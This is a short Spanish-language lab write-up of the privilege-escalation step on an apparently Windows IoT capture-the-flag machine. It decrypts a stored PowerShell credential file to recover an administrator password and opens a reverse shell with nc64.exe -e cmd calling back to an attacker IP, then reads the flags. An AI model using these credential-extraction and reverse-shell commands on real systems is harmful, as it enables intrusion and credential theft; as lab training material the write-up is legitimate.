## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
dir
```

Aqui vemos un fichero un poco raro llamado iot-admin.xml y el contenido tambien es un secret string.

```bash
(Import-CliXml -Path iot-admin.xml).GetNetworkCredential().password
```

Ya vemos un password para el usuario admin. Intentamos connectar al Windows Device Portal con el usuario administrator y
podemos connectarnos. Esto significa que vamos a hacer lo mismo que con el usuario app.

1. Nos ponemos en escuchar por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el ncat previamente uploadeado en el systema

    ```bash
    C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.8 443
    ```

Ya somos el usuario Administrator y intentamos ejecutar la operacion cryptografica para leer la flag.

```bash
cd C:\Data\administrator
powershell
(Import-CliXml -Path root.txt)
(Import-CliXml -Path root.txt).GetNetworkCredential()
(Import-CliXml -Path user.txt).GetNetworkCredential().password
```

Ya tenemos la flag del usuario Administrator.


